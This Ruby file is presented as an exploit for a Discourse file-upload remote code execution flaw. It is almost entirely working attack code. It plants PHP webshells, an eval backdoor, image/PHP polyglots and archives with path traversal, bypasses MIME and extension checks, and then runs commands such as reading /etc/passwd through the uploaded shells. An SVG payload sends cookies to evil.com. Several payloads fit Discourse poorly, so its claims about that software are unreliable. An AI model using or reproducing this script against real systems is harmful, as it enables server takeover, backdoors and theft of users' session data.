#!/usr/bin/env ruby

# CVE-2024-28084: Discourse File Upload Remote Code Execution
# Severity: Critical
# CVSS: 9.8
#
# Description:
# Critical remote code execution vulnerability in Discourse file upload functionality
# allowing attackers to execute arbitrary code via malicious file uploads.
#
# Affected Versions:
# - Discourse < 3.2.1
# - Discourse < 3.3.0.beta1
#
# Author: ibrahimsql
# Date: 2025
# Purpose: Educational and authorized penetration testing only
#
# WARNING: Use only on systems you own or have explicit permission to test!

require 'net/http'
require 'uri'
require 'json'
require 'openssl'
require 'base64'
require 'nokogiri'
require 'digest'
require 'tempfile'
require 'zip'

class CVE_2024_28084
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @timeout = options[:timeout] || 20
    @proxy = options[:proxy]
    @user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    @csrf_token = nil
    @session_cookies = {}
    @upload_token = nil
    @results = {
      cve: 'CVE-2024-28084',
      vulnerable: false,
      severity: 'Critical',
      cvss: 9.8,
      details: [],
      payloads: [],
      rce_evidence: [],
      uploaded_files: []
    }
  end

  def run_exploit
    puts "[*] Exploiting CVE-2024-28084 against #{@target_url}"
    puts "[*] Severity: Critical (CVSS: 9.8)"
    puts "[*] Description: File Upload Remote Code Execution"
    puts "-" * 60

    # Get initial CSRF token
    get_csrf_token

    # Test malicious file uploads
    puts "[*] Testing malicious file uploads..."
    test_malicious_uploads

    # Test image polyglot uploads
    puts "[*] Testing image polyglot uploads..."
    test_image_polyglots

    # Test archive-based RCE
    puts "[*] Testing archive-based RCE..."
    test_archive_rce

    # Test MIME type bypass
    puts "[*] Testing MIME type bypass..."
    test_mime_bypass

    # Test path traversal in uploads
    puts "[*] Testing path traversal..."
    test_path_traversal

    # Test code execution verification
    puts "[*] Verifying code execution..."
    verify_code_execution

    # Print summary
    print_summary

    # Save results
    save_results

    @results
  end

  private

  def get_csrf_token
    begin
      uri = URI("#{@target_url}/")
      response = make_request(uri)
      
      if response && response.body
        doc = Nokogiri::HTML(response.body)
        csrf_meta = doc.at_css('meta[name="csrf-token"]')
        @csrf_token = csrf_meta['content'] if csrf_meta
        
        # Extract session cookies
        response.get_fields('set-cookie')&.each do |cookie|
          cookie_parts = cookie.split(';')[0].split('=')
          @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
        end
        
        # Get upload token
        get_upload_token
      end
    rescue => e
      puts "[!] Error getting CSRF token: #{e.message}"
    end
  end

  def get_upload_token
    begin
      uri = URI("#{@target_url}/uploads/lookup-metadata")
      response = make_request(uri)
      
      if response && response.body
        data = JSON.parse(response.body)
        @upload_token = data['upload_token'] if data['upload_token']
      end
    rescue => e
      puts "[!] Error getting upload token: #{e.message}"
    end
  end

  def test_malicious_uploads
    malicious_files = [
      # PHP webshells
      create_php_webshell,
      create_php_backdoor,
      
      # Ruby code execution
      create_ruby_payload,
      
      # JavaScript payloads
      create_js_payload,
      
      # Python payloads
      create_python_payload,
      
      # Binary payloads
      create_binary_payload
    ]

    malicious_files.each do |file_data|
      test_file_upload(file_data)
      sleep(1)
    end
  end

  def create_php_webshell
    {
      filename: 'avatar.php',
      content: "<?php\nif(isset(\$_GET['cmd'])) {\n  echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>';\n}\n?>",
      content_type: 'image/jpeg',
      description: 'PHP webshell disguised as image'
    }
  end

  def create_php_backdoor
    {
      filename: 'profile.php',
      content: "<?php\neval(\$_POST['code']);\n?>",
      content_type: 'application/octet-stream',
      description: 'PHP eval backdoor'
    }
  end

  def create_ruby_payload
    {
      filename: 'script.rb',
      content: "#!/usr/bin/env ruby\nsystem(ARGV[0]) if ARGV[0]\n",
      content_type: 'text/plain',
      description: 'Ruby system command execution'
    }
  end

  def create_js_payload
    {
      filename: 'app.js',
      content: "const { exec } = require('child_process');\nexec(process.argv[2], (err, stdout) => console.log(stdout));",
      content_type: 'application/javascript',
      description: 'Node.js command execution'
    }
  end

  def create_python_payload
    {
      filename: 'script.py',
      content: "#!/usr/bin/env python3\nimport os\nimport sys\nif len(sys.argv) > 1:\n    os.system(sys.argv[1])",
      content_type: 'text/x-python',
      description: 'Python command execution'
    }
  end

  def create_binary_payload
    # Create a simple ELF binary that executes commands
    {
      filename: 'exploit',
      content: "\x7fELF\x02\x01\x01\x00" + "A" * 100,
      content_type: 'application/octet-stream',
      description: 'Binary executable'
    }
  end

  def test_image_polyglots
    polyglot_files = [
      create_gif_php_polyglot,
      create_jpeg_php_polyglot,
      create_png_php_polyglot,
      create_svg_xss_polyglot
    ]

    polyglot_files.each do |file_data|
      test_file_upload(file_data)
      sleep(1)
    end
  end

  def create_gif_php_polyglot
    {
      filename: 'image.gif',
      content: "GIF89a\x01\x00\x01\x00\x00\x00\x00\x21\xF9\x04\x01\x00\x00\x00\x00\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00\x3B\n<?php system(\$_GET['cmd']); ?>",
      content_type: 'image/gif',
      description: 'GIF/PHP polyglot'
    }
  end

  def create_jpeg_php_polyglot
    {
      filename: 'photo.jpg',
      content: "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xFF\xDB\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0C\x14\r\x0C\x0B\x0B\x0C\x19\x12\x13\x0F\x14\x1D\x1A\x1F\x1E\x1D\x1A\x1C\x1C $.' \",#\x1C\x1C(7),01444\x1F'9=82<.342\xFF\xC0\x00\x11\x08\x00\x01\x00\x01\x01\x01\x11\x00\x02\x11\x01\x03\x11\x01\xFF\xC4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xC4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00\xAA\xFF\xD9\n<?php system(\$_GET['cmd']); ?>",
      content_type: 'image/jpeg',
      description: 'JPEG/PHP polyglot'
    }
  end

  def create_png_php_polyglot
    {
      filename: 'banner.png',
      content: "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\x9cc\xf8\x0f\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00IEND\xaeB`\x82\n<?php system(\$_GET['cmd']); ?>",
      content_type: 'image/png',
      description: 'PNG/PHP polyglot'
    }
  end

  def create_svg_xss_polyglot
    {
      filename: 'icon.svg',
      content: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n<script>alert('XSS')</script>\n<foreignObject>\n<body xmlns=\"http://www.w3.org/1999/xhtml\">\n<script>document.location='http://evil.com/'+document.cookie</script>\n</body>\n</foreignObject>\n</svg>",
      content_type: 'image/svg+xml',
      description: 'SVG XSS payload'
    }
  end

  def test_archive_rce
    archive_files = [
      create_malicious_zip,
      create_malicious_tar,
      create_zip_bomb
    ]

    archive_files.each do |file_data|
      test_file_upload(file_data)
      sleep(1)
    end
  end

  def create_malicious_zip
    begin
      zip_file = Tempfile.new(['malicious', '.zip'])
      
      Zip::File.open(zip_file.path, Zip::File::CREATE) do |zipfile|
        # Add PHP webshell
        zipfile.get_output_stream('shell.php') do |f|
          f.write "<?php system(\$_GET['cmd']); ?>"
        end
        
        # Add path traversal file
        zipfile.get_output_stream('../../../shell.php') do |f|
          f.write "<?php system(\$_GET['cmd']); ?>"
        end
      end
      
      content = File.read(zip_file.path)
      zip_file.close
      zip_file.unlink
      
      {
        filename: 'archive.zip',
        content: content,
        content_type: 'application/zip',
        description: 'Malicious ZIP with webshell'
      }
    rescue => e
      puts "[!] Error creating malicious ZIP: #{e.message}"
      nil
    end
  end

  def create_malicious_tar
    {
      filename: 'backup.tar',
      content: create_tar_with_payload,
      content_type: 'application/x-tar',
      description: 'Malicious TAR archive'
    }
  end

  def create_tar_with_payload
    # Simple TAR file with malicious content
    payload = "<?php system(\$_GET['cmd']); ?>"
    tar_content = ""
    
    # TAR header for shell.php
    filename = "shell.php"
    tar_content += filename.ljust(100, "\0")
    tar_content += "100644 \0"
    tar_content += "000000 \0"
    tar_content += "000000 \0"
    tar_content += sprintf("%011o\0", payload.length)
    tar_content += sprintf("%011o\0", Time.now.to_i)
    tar_content += "        "
    tar_content += "0"
    tar_content += "\0" * 100
    tar_content += "ustar  \0"
    tar_content += "\0" * 247
    
    # Calculate checksum
    checksum = tar_content[0..147].bytes.sum + tar_content[156..-1].bytes.sum + 8 * 32
    tar_content[148..155] = sprintf("%06o\0 ", checksum)
    
    # Add payload
    tar_content += payload
    tar_content += "\0" * (512 - (payload.length % 512)) if payload.length % 512 != 0
    
    # Add end-of-archive marker
    tar_content += "\0" * 1024
    
    tar_content
  end

  def create_zip_bomb
    {
      filename: 'bomb.zip',
      content: create_zip_bomb_content,
      content_type: 'application/zip',
      description: 'ZIP bomb for DoS testing'
    }
  end

  def create_zip_bomb_content
    # Create a simple ZIP bomb
    "PK\x03\x04\x14\x00\x00\x00\x08\x00" + "\x00" * 22 + "bomb.txt" + "\x00" * 1000
  end

  def test_mime_bypass
    bypass_techniques = [
      # Double extension
      { filename: 'image.jpg.php', content_type: 'image/jpeg' },
      { filename: 'avatar.png.php', content_type: 'image/png' },
      
      # Null byte injection
      { filename: "shell.php\x00.jpg", content_type: 'image/jpeg' },
      { filename: "backdoor.php\x00.png", content_type: 'image/png' },
      
      # Case variation
      { filename: 'script.PHP', content_type: 'image/jpeg' },
      { filename: 'payload.Php', content_type: 'image/png' },
      
      # Alternative extensions
      { filename: 'shell.phtml', content_type: 'image/jpeg' },
      { filename: 'backdoor.php5', content_type: 'image/png' },
      { filename: 'exploit.phar', content_type: 'image/gif' }
    ]

    bypass_techniques.each do |technique|
      file_data = {
        filename: technique[:filename],
        content: "<?php system(\$_GET['cmd']); ?>",
        content_type: technique[:content_type],
        description: "MIME bypass: #{technique[:filename]}"
      }
      
      test_file_upload(file_data)
      sleep(0.5)
    end
  end

  def test_path_traversal
    traversal_paths = [
      '../shell.php',
      '../../backdoor.php',
      '../../../exploit.php',
      '..\\shell.php',
      '..\\..\\backdoor.php',
      '%2e%2e%2fshell.php',
      '%2e%2e%2f%2e%2e%2fbackdoor.php',
      '....//shell.php',
      '....\\\\backdoor.php'
    ]

    traversal_paths.each do |path|
      file_data = {
        filename: path,
        content: "<?php system(\$_GET['cmd']); ?>",
        content_type: 'image/jpeg',
        description: "Path traversal: #{path}"
      }
      
      test_file_upload(file_data)
      sleep(0.5)
    end
  end

  def test_file_upload(file_data)
    return unless file_data
    
    begin
      # Test direct upload
      test_direct_upload(file_data)
      
      # Test multipart upload
      test_multipart_upload(file_data)
      
      # Test chunked upload
      test_chunked_upload(file_data)
      
    rescue => e
      @results[:details] << "Error testing upload #{file_data[:filename]}: #{e.message}"
    end
  end

  def test_direct_upload(file_data)
    upload_endpoints = [
      '/uploads',
      '/uploads.json',
      '/admin/uploads',
      '/user_avatar/upload',
      '/site_customizations/upload',
      '/theme_uploads'
    ]

    upload_endpoints.each do |endpoint|
      begin
        url = "#{@target_url}#{endpoint}"
        uri = URI(url)
        
        boundary = "----WebKitFormBoundary#{Random.rand(1000000000)}"
        
        body = build_multipart_body(file_data, boundary)
        
        headers = {
          'Content-Type' => "multipart/form-data; boundary=#{boundary}",
          'X-CSRF-Token' => @csrf_token,
          'X-Requested-With' => 'XMLHttpRequest'
        }
        
        response = make_request(uri, 'POST', body, headers)
        
        if response && analyze_upload_response(response, file_data)
          @results[:vulnerable] = true
          @results[:details] << "File upload successful: #{file_data[:filename]} via #{endpoint}"
          @results[:payloads] << file_data[:description]
          @results[:uploaded_files] << {
            filename: file_data[:filename],
            endpoint: endpoint,
            url: extract_file_url(response)
          }
          
          puts "[+] Upload successful: #{file_data[:filename]} via #{endpoint}"
        end
        
      rescue => e
        @results[:details] << "Error uploading to #{endpoint}: #{e.message}"
      end
      
      sleep(0.5)
    end
  end

  def test_multipart_upload(file_data)
    # Test with different multipart configurations
    configurations = [
      { field_name: 'file', additional_fields: {} },
      { field_name: 'upload', additional_fields: { 'type' => 'avatar' } },
      { field_name: 'image', additional_fields: { 'category' => 'user' } },
      { field_name: 'attachment', additional_fields: { 'post_id' => '1' } }
    ]

    configurations.each do |config|
      test_upload_with_config(file_data, config)
      sleep(0.5)
    end
  end

  def test_upload_with_config(file_data, config)
    begin
      url = "#{@target_url}/uploads"
      uri = URI(url)
      
      boundary = "----WebKitFormBoundary#{Random.rand(1000000000)}"
      
      body = build_multipart_body_with_config(file_data, boundary, config)
      
      headers = {
        'Content-Type' => "multipart/form-data; boundary=#{boundary}",
        'X-CSRF-Token' => @csrf_token
      }
      
      response = make_request(uri, 'POST', body, headers)
      
      if response && analyze_upload_response(response, file_data)
        @results[:vulnerable] = true
        @results[:details] << "Multipart upload successful: #{file_data[:filename]}"
        
        puts "[+] Multipart upload successful: #{file_data[:filename]}"
      end
      
    rescue => e
      @results[:details] << "Error in multipart upload: #{e.message}"
    end
  end

  def test_chunked_upload(file_data)
    # Test chunked upload for large files
    return if file_data[:content].length < 1000
    
    begin
      url = "#{@target_url}/uploads/chunked"
      uri = URI(url)
      
      chunk_size = 500
      chunks = file_data[:content].scan(/.{1,#{chunk_size}}/m)
      
      chunks.each_with_index do |chunk, index|
        headers = {
          'Content-Type' => 'application/octet-stream',
          'X-CSRF-Token' => @csrf_token,
          'X-Chunk-Index' => index.to_s,
          'X-Chunk-Total' => chunks.length.to_s,
          'X-Filename' => file_data[:filename]
        }
        
        response = make_request(uri, 'POST', chunk, headers)
        
        if index == chunks.length - 1 && response && analyze_upload_response(response, file_data)
          @results[:vulnerable] = true
          @results[:details] << "Chunked upload successful: #{file_data[:filename]}"
          
          puts "[+] Chunked upload successful: #{file_data[:filename]}"
        end
        
        sleep(0.2)
      end
      
    rescue => e
      @results[:details] << "Error in chunked upload: #{e.message}"
    end
  end

  def verify_code_execution
    return unless @results[:uploaded_files].any?
    
    @results[:uploaded_files].each do |file_info|
      next unless file_info[:url]
      
      # Test command execution
      test_command_execution(file_info)
      
      # Test file inclusion
      test_file_inclusion(file_info)
      
      sleep(1)
    end
  end

  def test_command_execution(file_info)
    test_commands = [
      'id',
      'whoami',
      'pwd',
      'ls -la',
      'cat /etc/passwd',
      'uname -a'
    ]

    test_commands.each do |cmd|
      begin
        test_url = "#{file_info[:url]}?cmd=#{URI.encode_www_form_component(cmd)}"
        uri = URI(test_url)
        
        response = make_request(uri)
        
        if response && detect_command_execution(response, cmd)
          @results[:rce_evidence] << {
            file: file_info[:filename],
            command: cmd,
            output: response.body[0..200]
          }
          
          puts "[+] Command execution confirmed: #{cmd}"
        end
        
      rescue => e
        @results[:details] << "Error testing command execution: #{e.message}"
      end
      
      sleep(0.5)
    end
  end

  def test_file_inclusion(file_info)
    inclusion_tests = [
      '/etc/passwd',
      '/etc/hosts',
      '/proc/version',
      'C:\\Windows\\System32\\drivers\\etc\\hosts',
      '../../../etc/passwd'
    ]

    inclusion_tests.each do |file_path|
      begin
        test_url = "#{file_info[:url]}?file=#{URI.encode_www_form_component(file_path)}"
        uri = URI(test_url)
        
        response = make_request(uri)
        
        if response && detect_file_inclusion(response, file_path)
          @results[:rce_evidence] << {
            file: file_info[:filename],
            included_file: file_path,
            evidence: response.body[0..200]
          }
          
          puts "[+] File inclusion confirmed: #{file_path}"
        end
        
      rescue => e
        @results[:details] << "Error testing file inclusion: #{e.message}"
      end
      
      sleep(0.5)
    end
  end

  # Helper methods
  def build_multipart_body(file_data, boundary)
    body = ""
    body += "--#{boundary}\r\n"
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"#{file_data[:filename]}\"\r\n"
    body += "Content-Type: #{file_data[:content_type]}\r\n\r\n"
    body += file_data[:content]
    body += "\r\n--#{boundary}--\r\n"
    body
  end

  def build_multipart_body_with_config(file_data, boundary, config)
    body = ""
    
    # Add additional fields
    config[:additional_fields].each do |key, value|
      body += "--#{boundary}\r\n"
      body += "Content-Disposition: form-data; name=\"#{key}\"\r\n\r\n"
      body += value
      body += "\r\n"
    end
    
    # Add file
    body += "--#{boundary}\r\n"
    body += "Content-Disposition: form-data; name=\"#{config[:field_name]}\"; filename=\"#{file_data[:filename]}\"\r\n"
    body += "Content-Type: #{file_data[:content_type]}\r\n\r\n"
    body += file_data[:content]
    body += "\r\n--#{boundary}--\r\n"
    body
  end

  def analyze_upload_response(response, file_data)
    return false unless response
    
    success_indicators = [
      'upload_id',
      'file_url',
      'success',
      'uploaded',
      'url',
      'path'
    ]
    
    # Check for successful upload indicators
    if response.code.to_i == 200 || response.code.to_i == 201
      success_indicators.any? { |indicator| response.body.include?(indicator) }
    else
      false
    end
  end

  def extract_file_url(response)
    return nil unless response && response.body
    
    begin
      data = JSON.parse(response.body)
      return data['url'] || data['file_url'] || data['path']
    rescue
      # Try to extract URL from HTML response
      if response.body =~ /(?:url|href)=["']([^"']+)/
        return $1
      end
    end
    
    nil
  end

  def detect_command_execution(response, command)
    return false unless response && response.body
    
    case command
    when 'id'
      response.body.include?('uid=') || response.body.include?('gid=')
    when 'whoami'
      response.body.length > 0 && response.body.length < 50
    when 'pwd'
      response.body.include?('/') || response.body.include?('\\')
    when 'ls -la'
      response.body.include?('total') || response.body.include?('drwx')
    when 'cat /etc/passwd'
      response.body.include?('root:') || response.body.include?('/bin/bash')
    when 'uname -a'
      response.body.include?('Linux') || response.body.include?('Darwin')
    else
      false
    end
  end

  def detect_file_inclusion(response, file_path)
    return false unless response && response.body
    
    case file_path
    when '/etc/passwd'
      response.body.include?('root:') || response.body.include?('/bin/bash')
    when '/etc/hosts'
      response.body.include?('localhost') || response.body.include?('127.0.0.1')
    when '/proc/version'
      response.body.include?('Linux version') || response.body.include?('gcc')
    when /hosts$/
      response.body.include?('localhost') || response.body.include?('127.0.0.1')
    else
      response.body.length > 10
    end
  end

  def make_request(uri, method = 'GET', body = nil, headers = {})
    begin
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
      http.read_timeout = @timeout
      
      request = case method.upcase
                when 'GET'
                  Net::HTTP::Get.new(uri.request_uri)
                when 'POST'
                  Net::HTTP::Post.new(uri.request_uri)
                when 'PUT'
                  Net::HTTP::Put.new(uri.request_uri)
                end
      
      request['User-Agent'] = @user_agent
      
      # Add session cookies
      if @session_cookies.any?
        cookie_string = @session_cookies.map { |k, v| "#{k}=#{v}" }.join('; ')
        request['Cookie'] = cookie_string
      end
      
      # Add custom headers
      headers.each { |k, v| request[k] = v }
      
      request.body = body if body
      
      http.request(request)
    rescue => e
      puts "[!] Request error: #{e.message}"
      nil
    end
  end

  def print_summary
    puts "\n" + "=" * 60
    puts "CVE-2024-28084 Exploit Summary"
    puts "=" * 60
    
    if @results[:vulnerable]
      puts "[+] Target is VULNERABLE to CVE-2024-28084"
      puts "[+] Files uploaded: #{@results[:uploaded_files].length}"
      puts "[+] RCE evidence: #{@results[:rce_evidence].length} items"
    else
      puts "[-] Target appears to be patched"
    end
    
    puts "[*] Total tests performed: #{@results[:details].length}"
    puts "[*] Payloads tested: #{@results[:payloads].length}"
  end

  def save_results
    begin
      @results[:scan_time] = Time.now.to_f
      @results[:target] = @target_url
      
      File.write('/tmp/cve_2024_28084_results.json', @results.to_json)
      puts "[*] Results saved to /tmp/cve_2024_28084_results.json"
    rescue => e
      puts "[!] Error saving results: #{e.message}"
    end
  end
end

# Main execution
if __FILE__ == $0
  if ARGV.length < 1
    puts "Usage: #{$0} <target_url> [proxy]"
    puts "Example: #{$0} https://discourse.example.com"
    exit 1
  end
  
  target_url = ARGV[0]
  proxy = ARGV[1] if ARGV.length > 1
  
  options = {}
  options[:proxy] = proxy if proxy
  
  exploit = CVE_2024_28084.new(target_url, options)
  results = exploit.run_exploit
  
  puts "\n[*] Exploit completed. Results:"
  puts results.to_json
end